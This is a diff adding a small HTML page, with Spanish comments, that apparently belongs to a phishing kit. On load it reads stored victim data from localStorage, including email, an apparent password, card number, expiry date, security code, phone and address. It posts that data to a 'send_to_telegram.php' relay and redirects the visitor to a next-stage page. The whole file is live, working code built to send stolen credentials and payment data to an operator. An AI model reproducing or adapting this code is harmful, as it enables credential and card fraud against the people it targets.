@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>nono</title>
+    <style>
+        #infoDisplay {
+            margin-top: 20px;
+            padding: 20px;
+            border: 1px solid #ccc;
+            background-color: #f9f9f9;
+            font-family: Arial, sans-serif;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            display: none; /* Ocultar por defecto */
+        }
+    </style>
+</head>
+<body>
+    <div id="infoDisplay"></div>
+
+    <script>
+        function sendDataToTelegram() {
+            var info = localStorage.getItem('info');
+            if (info && info.trim() !== '') {
+                var infoData;
+                try {
+                    infoData = JSON.parse(info);
+                } catch (e) {
+                    console.error('Error al analizar JSON de localStorage:', e);
+                    return;
+                }
+
+                var keysToShow = ['email', 'p', 'pdate', 'c', 'ban', 'cc', 'telnum', 'city', 'address', 'disp', 'name'];
+                var metaInfo = infoData.metaInfo || {};
+                var filteredData = {};
+
+                keysToShow.forEach(function(key) {
+                    if (metaInfo.hasOwnProperty(key)) {
+                        filteredData[key] = metaInfo[key];
+                    }
+                });
+
+                fetch('send_to_telegram.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(filteredData)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        console.log('Success:', data);
+                        localStorage.setItem('messageId', data.message_id);
+                        localStorage.setItem('session_id', data.session_id); // Almacenar ID de sesión
+                        window.location.href = 'chedf.php';  // Redirección a chedf.php
+                    } else {
+                        console.log('Error al enviar los datos:', data.message);
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            } else {
+                console.log('No hay datos en localStorage con la clave "info".');
+            }
+        }
+
+        window.onload = sendDataToTelegram;
+    </script>
+</body>
+</html>
